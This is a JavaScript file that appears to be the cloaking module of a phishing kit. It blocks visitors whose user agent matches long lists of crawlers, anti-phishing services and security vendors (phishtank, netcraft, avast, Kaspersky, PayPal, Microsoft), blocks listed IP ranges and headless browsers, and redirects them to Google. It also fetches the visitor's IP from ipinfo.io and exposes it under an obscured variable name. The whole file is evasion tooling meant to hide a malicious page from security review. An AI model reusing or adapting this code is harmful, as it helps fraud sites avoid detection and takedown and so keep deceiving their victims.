(async function () {
  const IP_STORAGE_KEY = "mtaP";
  const COUNTRY_STORAGE_KEY = "COU";
  const userAgent = navigator.userAgent.toLowerCase();
  /** üõë 1Ô∏è‚É£ Block bots based on User-Agent **/
const blockedAgents = [
    "Google",
    "Slurp",
    "MSNBot",
    "ia_archiver",
    "Yandex",
    "Rambler",
    "drweb",
    "hostinger",
    "scanurl",
    "above",
    "google",
    "Dr.Web",
    "facebook",
    "softlayer",
    "amazonaws",
    "cyveillance",
    "dreamhost",
    "netpilot",
    "calyxinstitute",
    "tor-exit",
    "phishtank",
    "msnbot",
    "p3pwgdsn",
    "netcraft",
    "trendmicro",
    "ebay",
    "paypal",
    "torservers",
    "messagelabs",
    "sucuri.net",
    "crawler",
    "bot",
    "apache-httpclient",
    "lssrocketcrawler",
    "urlredirectresolver",
    "jetbrains",
    "spam",
    "windows 95",
    "windows 98",
    "acunetix",
    "netsparker",
    "007ac9",
    "008",
    "192.comagent",
    "200pleasebot",
    "360spider",
    "4seohuntbot",
    "50.nu",
    "a6-indexer",
    "admantx",
    "amznkassocbot",
    "aboundexbot",
    "aboutusbot",
    "abrave spider",
    "accelobot",
    "acoonbot",
    "addthis.com",
    "adsbot-google",
    "ahrefsbot",
    "alexabot",
    "amagit.com",
    "analytics",
    "antbot",
    "apercite",
    "aportworm",
    "EBAY",
    "CL0NA",
    "jabber",
    "arabot",
    "hotmail!",
    "msn!",
    "outlook!",
    "outlook",
    "msn",
    "hotmail",
    "compatible",
    //"mozilla",
    "Trident",
    "X11",
    "Windows XP",
    "windows xp",
    "Googlebot",
    "Baiduspider",
    "R6_FeedFetcher",
    "NetcraftSurveyAgent",
    "Sogou web spider",
    "bingbot",
    "Yahoo! Slurp",
    "facebookexternalhit",
    "PrintfulBot",
    "Twitterbot",
    "UnwindFetchor",
    "urlresolver",
    "Butterfly",
    "TweetmemeBot",
    "PaperLiBot",
    "MJ12bot",
    "AhrefsBot",
    "Exabot",
    "Ezooms",
    "YandexBot",
    "SearchmetricsBot",
    "picsearch",
    "TweetedTimes Bot",
    "QuerySeekerSpider",
    "ShowyouBot",
    "woriobot",
    "merlinkbot",
    "BazQuxBot",
    "Kraken",
    "SISTRIX Crawler",
    "R6_CommentReader",
    "magpie-crawler",
    "GrapeshotCrawler",
    "PercolateCrawler",
    "MaxPointCrawler",
    "NetSeer crawler",
    "grokkit-crawler",
    "SMXCrawler",
    "PulseCrawler",
    "Y!J-BRW",
    "80legs.com/webcrawler",
    "Mediapartners-Google",
    "Spinn3r",
    "InAGist",
    "Python-urllib",
    "NING",
    "TencentTraveler",
    "Feedfetcher-Google",
    "mon.itor.us",
    "spbot",
    "Feedly",
    "curl",
    "spider",
    "abot",
    "dbot",
    "ebot",
    "hbot",
    "kbot",
    "lbot",
    "mbot",
    "nbot",
    "obot",
    "pbot",
    "rbot",
    "sbot",
    "tbot",
    "vbot",
    "ybot",
    "zbot",
    "bot.",
    "bot/",
    "_bot",
    ".bot",
    "/bot",
    "-bot",
    ":bot",
    "(bot",
    "crawl",
    "slurp",
    "seek",
    "accoona",
    "acoon",
    "adressendeutschland",
    "ah-ha.com",
    "ahoy",
    "altavista",
    "ananzi",
    "anthill",
    "appie",
    "arachnophilia",
    "arale",
    "araneo",
    "aranha",
    "architext",
    "aretha",
    "arks",
    "asterias",
    "atlocal",
    "atn",
    "atomz",
    "augurfind",
    "backrub",
    "bannana_bot",
    "baypup",
    "bdfetch",
    "big brother",
    "biglotron",
    "bjaaland",
    "blackwidow",
    "blaiz",
    "blog",
    "blo.",
    "bloodhound",
    "boitho",
    "booch",
    "bradley",
    "butterfly",
    "calif",
    "cassandra",
    "ccubee",
    "cfetch",
    "charlotte",
    "churl",
    "cienciaficcion",
    "cmc",
    "collective",
    "comagent",
    "combine",
    "computingsite",
    "csci",
    "cusco",
    "daumoa",
    "deepindex",
    "delorie",
    "depspid",
    "deweb",
    "echo blinde kuh",
    "digger",
    "ditto",
    "dmoz",
    "docomo",
    "download express",
    "dtaagent",
    "dwcp",
    "ebiness",
    "ebingbong",
    "e-collector",
    "ejupiter",
    "emacs-w3 search engine",
    "esther",
    "evliya celebi",
    "ezresult",
    "falcon",
    "felix ide",
    "ferret",
    "fetchrover",
    "fido",
    "findlinks",
    "fireball",
    "fish search",
    "fouineur",
    "funnelweb",
    "gazz",
    "gcreep",
    "genieknows",
    "getterroboplus",
    "geturl",
    "glx",
    "goforit",
    "golem",
    "grabber",
    "grapnel",
    "gralon",
    "griffon",
    "gromit",
    "grub",
    "gulliver",
    "hamahakki",
    "harvest",
    "havindex",
    "helix",
    "heritrix",
    "hku www octopus",
    "homerweb",
    "htdig",
    "html index",
    "html_analyzer",
    "htmlgobble",
    "hubater",
    "hyper-decontextualizer",
    "ibm_planetwide",
    "ichiro",
    "iconsurf",
    "iltrovatore",
    "image.kapsi.net",
    "imagelock",
    "incywincy",
    "indexer",
    "infobee",
    "informant",
    "ingrid",
    "inktomisearch.com",
    "inspector web",
    "intelliagent",
    "internet shinchakubin",
    "ip3000",
    "iron33",
    "israeli-search",
    "ivia",
    "jack",
    "jakarta",
    "javabee",
    "jetbot",
    "jumpstation",
    "katipo",
    "kdd-explorer",
    "kilroy",
    "knowledge",
    "kototoi",
    "kretrieve",
    "labelgrabber",
    "lachesis",
    "larbin",
    "legs",
    "libwww",
    "linkalarm",
    "link validator",
    "linkscan",
    "lockon",
    "lwp",
    "lycos",
    "magpie",
    "mantraagent",
    "mapoftheinternet",
    "marvin/",
    "mattie",
    "mediafox",
    "mediapartners",
    "mercator",
    "merzscope",
    "microsoft url control",
    "minirank",
    "miva",
    "mj12",
    "mnogosearch",
    "moget",
    "monster",
    "moose",
    "motor",
    "multitext",
    "muncher",
    "muscatferret",
    "mwd.search",
    "myweb",
    "najdi",
    "nameprotect",
    "nationaldirectory",
    "nazilla",
    "ncsa beta",
    "nec-meshexplorer",
    "nederland.zoek",
    "netcarta webmap engine",
    "netmechanic",
    "netresearchserver",
    "netscoop",
    "newscan-online",
    "nhse",
    "nokia6682/",
    "nomad",
    "noyona",
    "nutch",
    "nzexplorer",
    "objectssearch",
    "occam",
    "omni",
    "open text",
    "openfind",
    "openintelligencedata",
    "orb search",
    "osis-project",
    "pack rat",
    "pageboy",
    "pagebull",
    "page_verifier",
    "panscient",
    "parasite",
    "partnersite",
    "patric",
    "pear.",
    "pegasus",
    "peregrinator",
    "pgp key agent",
    "phantom",
    "phpdig",
    "picosearch",
    "piltdownman",
    "pimptrain",
    "pinpoint",
    "pioneer",
    "piranha",
    "plumtreewebaccessor",
    "pogodak",
    "poirot",
    "pompos",
    "poppelsdorf",
    "poppi",
    "popular iconoclast",
    "psycheclone",
    "publisher",
    "python",
    "rambler",
    "raven search",
    "roach",
    "road runner",
    "roadhouse",
    "robbie",
    "robofox",
    "robozilla",
    "rules",
    "salty",
    "sbider",
    "scooter",
    "scoutjet",
    "scrubby",
    "search.",
    "searchprocess",
    "semanticdiscovery",
    "senrigan",
    "sg-scout",
    "shai'hulud",
    "shark",
    "shopwiki",
    "sidewinder",
    "sift",
    "silk",
    "simmany",
    "site searcher",
    "site valet",
    "sitetech-rover",
    "skymob.com",
    "sleek",
    "smartwit",
    "sna-",
    "snappy",
    "snooper",
    "sohu",
    "speedfind",
    "sphere",
    "sphider",
    "spinner",
    "spyder",
    "steeler/",
    "suke",
    "suntek",
    "supersnooper",
    "surfnomore",
    "sven",
    "sygol",
    "szukacz",
    "tach black widow",
    "tarantula",
    "templeton",
    "/teoma",
    "t-h-u-n-d-e-r-s-t-o-n-e",
    "theophrastus",
    "titan",
    "titin",
    "tkwww",
    "toutatis",
    "t-rex",
    "tutorgig",
    "twiceler",
    "twisted",
    "ucsd",
    "udmsearch",
    "url check",
    "updated",
    "vagabondo",
    "valkyrie",
    "verticrawl",
    "victoria",
    "vision-search",
    "volcano",
    "voyager/",
    "voyager-hc",
    "w3c_validator",
    "w3m2",
    "w3mir",
    "walker",
    "wallpaper",
    "wanderer",
    "wauuu",
    "wavefire",
    "web core",
    "web hopper",
    "web wombat",
    "webbandit",
    "webcatcher",
    "webcopy",
    "webfoot",
    "weblayers",
    "weblinker",
    "weblog monitor",
    "webmirror",
    "webmonkey",
    "webquest",
    "webreaper",
    "websitepulse",
    "websnarf",
    "webstolperer",
    "webvac",
    "webwalk",
    "webwatch",
    "webwombat",
    "webzinger",
    "wget",
    "whizbang",
    "whowhere",
    "wild ferret",
    "worldlight",
    "wwwc",
    "wwwster",
    "xenu",
    "xget",
    "xift",
    "xirq",
    "yandex",
    "yanga",
    "yeti",
    "yodao",
    "zao/",
    "zippp",
    "zyborg",
    "googlebot",
    "yahoo",
    "yahooSeeker",
    "yandexbot",
    "baiduspider",
    "httrack",
    "pycurl",
    "python-requests",
    "phish",
    "Http Crawler",
    "avast",
    "DigitalOcean",
    "Amazon",
    "net4sec",
    "AVAST Software s.r.o.",
    "BullGuard ApS",
    "PayPal",
    "Hotmail",
    "Yahoo",
    "AOL",
    "Microsoft",
    "Kaspersky Lab",
    "Linode, LLC",
    "MSN",
    "ONLINE S.A.S.",
    "Joshua Peter McQuistan",
    "die blinde kuh",
    "yahoo!",
    "ABACHOBot",
    "Accoona-AI-Agent",
    "AddSugarSpiderBot",
    "AnyApexBot",
    "Arachmo",
    "B-l-i-t-z-B-O-T",
    "BecomeBot",
    "BeslistBot",
    "BillyBobBot",
    "Bimbot",
    "Bingbot",
    "BlitzBOT",
    "boitho.com-dc",
    "boitho.com-robot",
    "btbot",
    "CatchBot",
    "Cerberian Drtrs",
    "Charlotte",
    "ConveraCrawler",
    "cosmos",
    "Covario IDS",
    "DataparkSearch",
    "DiamondBot",
    "Discobot",
    "Dotbot",
    "EARTHCOM.info",
    "EmeraldShield.com WebBot",
    "envolk[ITS]spider",
    "EsperanzaBot",
    "FAST Enterprise Crawler",
    "FAST-WebCrawler",
    "FDSE robot",
    "FindLinks",
    "FurlBot",
    "FyberSpider",
    "g2crawler",
    "Gaisbot",
    "GalaxyBot",
    "genieBot",
    "Gigabot",
    "Girafabot",
    "Googlebot-Image",
    "GurujiBot",
    "HappyFunBot",
    "hl_ftien_spider",
    "Holmes",
    "iaskspider",
    "iCCrawler",
    "igdeSpyder",
    "IRLbot",
    "IssueCrawler",
    "Jaxified Bot",
    "Jyxobot",
    "KoepaBot",
    "L.webis",
    "LapozzBot",
    "Larbin",
    "LDSpider",
    "LexxeBot",
    "Linguee Bot",
    "LinkWalker",
    "lmspider",
    "lwp-trivial",
    "mabontland",
    "masscan-ng",
    "MLBot",
    "Mnogosearch",
    "mogimogi",
    "MojeekBot",
    "Moreoverbot",
    "Morning Paper",
    "MSRBot",
    "MVAClient",
    "mxbot",
    "NetResearchServer",
    "NetSeer Crawler",
    "NewsGator",
    "NG-Search",
    "nicebot",
    "noxtrumbot",
    "Nusearch Spider",
    "NutchCVS",
    "Nymesis",
    "oegp",
    "omgilibot",
    "OmniExplorer_Bot",
    "OOZBOT",
    "Orbiter",
    "PageBitesHyperBot",
    "Peew",
    "polybot",
    "Pompos",
    "PostPost",
    "Psbot",
    "PycURL",
    "Qseero",
    "Radian6",
    "RAMPyBot",
    "RufusBot",
    "SandCrawler",
    "SBIder",
    "ScoutJet",
    "Scrubby",
    "SearchSight",
    "Seekbot",
    "Sensis Web Crawler",
    "SEOChat::Bot",
    "SeznamBot",
    "Shim-Crawler",
    "ShopWiki",
    "Shoula robot",
    "Sitebot",
    "Snappy",
    "sogou spider",
    "Sosospider",
    "Speedy Spider",
    "Sqworm",
    "StackRambler",
    "suggybot",
    "SurveyBot",
    "SynooBot",
    "Teoma",
    "TerrawizBot",
    "TheSuBot",
    "Thumbnail.CZ robot",
    "TinEye",
    "truwoGPS",
    "TurnitinBot",
    "TwengaBot",
    "Urlfilebot",
    "Vagabondo",
    "VoilaBot",
    "Vortex",
    "voyager",
    "VYU2",
    "webcollage",
    "Websquash.com",
    "wf84",
    "WoFindeIch Robot",
    "WomlpeFactory",
    "Xaldon_WebSpider",
    "yacy",
    "Yahoo! Slurp China",
    "YahooSeeker",
    "YahooSeeker-Testing",
    "YandexImages",
    "YandexMetrika",
    "Yasaklibot",
    "Yeti",
    "YodaoBot",
    "yoogliFetchAgent",
    "YoudaoBot",
    "Zao",
    "Zealbot",
    "zspider",
    "ZyBorg",
    "AbiLogicBot",
    "Link Valet",
    "Link Validity Check",
    "LinkExaminer",
    "LinksManager.com_bot",
    "Mojoo Robot",
    "Notifixious",
    "online link validator",
    "Ploetz + Zeller",
    "Reciprocal Link System PRO",
    "REL Link Checker Lite",
    "SiteBar",
    "Vivante Link Checker",
    "W3C-checklink",
    "Xenu Link Sleuth",
    "EmailSiphon",
    "CSE HTML Validator",
    "CSSCheck",
    "Cynthia",
    "HTMLParser",
    "P3P Validator",
    "W3C_CSS_Validator_JFouffa",
    "W3C_Validator",
    "WDG_Validator",
    "Awasu",
    "Bloglines",
    "everyfeed-spider",
    "FeedFetcher-Google",
    "GreatNews",
    "Gregarius",
    "MagpieRSS",
    "NFReader",
    "UniversalFeedParser",
    "BinGet",
    "cURL",
    "Java",
    "libwww-perl",
    "Microsoft URL Control",
    "Peach",
    "PHP",
    "pxyscand",
    "AppEngine-Google",
    "!Susie",
    "Amaya",
    "Cocoal.icio.us",
    "DomainsDB.net MetaCrawler",
    "gPodder",
    "GSiteCrawler",
    "iTunes",
    "lftp",
    "MetaURI",
    "MT-NewsWatcher",
    "Nitro PDF",
    "Snoopy",
    "URD-MAGPIE",
    "WebCapture",
    "Windows-Media-Player"];

  if (blockedAgents.some(agent => userAgent.includes(agent))) {
    window.location.href = "https://www.google.com/";
  }

  /** üõë 2Ô∏è‚É£ Fetch User IP and Country if not cached **/
  let mtaP = sessionStorage.getItem(IP_STORAGE_KEY);
  let userCountry = sessionStorage.getItem(COUNTRY_STORAGE_KEY);

  if (!mtaP || !userCountry) {
    try {
      const response = await fetch("https://ipinfo.io/json");
      const data = await response.json();
      
      mtaP = data.ip;
      userCountry = data.country;

      sessionStorage.setItem(IP_STORAGE_KEY, mtaP);
      sessionStorage.setItem(COUNTRY_STORAGE_KEY, userCountry);

    } catch (error) {
      mtaP = "Unknown IP";
      userCountry = "Unknown Country"; // Fallback if API fails
    }
  } else {
  }
  window.mtaP = mtaP;
  window.userAgent = userAgent;

  /** üõë 3Ô∏è‚É£ Block bots based on IP pattern matching **/
const blockedIPs = [
  /^66\.102\..*/, /^38\.100\..*/, /^107\.170\..*/, /^149\.20\..*/, /^38\.105\..*/, 
  /^173\.239\..*/, /^173\.244\.36\..*/, /^74\.125\..*/, /^66\.150\.14\..*/, /^54\.176\..*/, 
  /^184\.173\..*/, /^66\.249\..*/, /^128\.242\..*/, /^72\.14\.192\..*/, /^208\.65\.144\..*/, 
  /^209\.85\.128\..*/, /^216\.239\.32\..*/, /^207\.126\.144\..*/, /^173\.194\..*/, 
  /^64\.233\.160\..*/, /^64\.18\..*/, /^194\.52\.68\..*/, /^194\.72\.238\..*/, 
  /^62\.116\.207\..*/, /^212\.50\.193\..*/, /^69\.65\..*/, /^50\.7\..*/, /^131\.212\..*/, 
  /^46\.116\..*/, /^62\.90\..*/, /^89\.138\..*/, /^82\.166\..*/, /^85\.64\..*/, 
  /^85\.250\..*/, /^93\.172\..*/, /^109\.186\..*/, /^194\.90\..*/, /^212\.29\.192\..*/, 
  /^212\.29\.224\..*/, /^212\.143\..*/, /^212\.150\..*/, /^212\.235\..*/, /^217\.132\..*/, 
  /^50\.97\..*/, /^209\.85\..*/, /^66\.205\.64\..*/, /^204\.14\.48\..*/, /^64\.27\.2\..*/, 
  /^67\.15\..*/, /^202\.108\.252\..*/, /^193\.47\.80\..*/, /^64\.62\.136\..*/, 
  /^66\.221\..*/, /^64\.62\.175\..*/, /^198\.54\..*/, /^192\.115\.134\..*/, /^216\.252\.167\..*/, 
  /^193\.253\.199\..*/, /^69\.61\.12\..*/, /^64\.37\.103\..*/, /^38\.144\.36\..*/, 
  /^64\.124\.14\..*/, /^206\.28\.72\..*/, /^209\.73\.228\..*/, /^158\.108\..*/, /^168\.188\..*/
];

  if (mtaP && blockedIPs.some(pattern => pattern.test(mtaP))) {
    sessionStorage.clear();
    sessionStorage.clear();  
    window.location.href = "https://www.google.com/";
  }
  const isHeadless = () => {
    return navigator.webdriver ||
      /HeadlessChrome|puppeteer|phantomjs/i.test(navigator.userAgent) ||
      !navigator.plugins.length ||
      !navigator.languages ||
      window.outerWidth === 0 ||
      window.outerHeight === 0;
  };

  if (isHeadless()) {
    // üö´ Bot detected, redirect away
    window.location.href = 'https://google.com';
  }

})();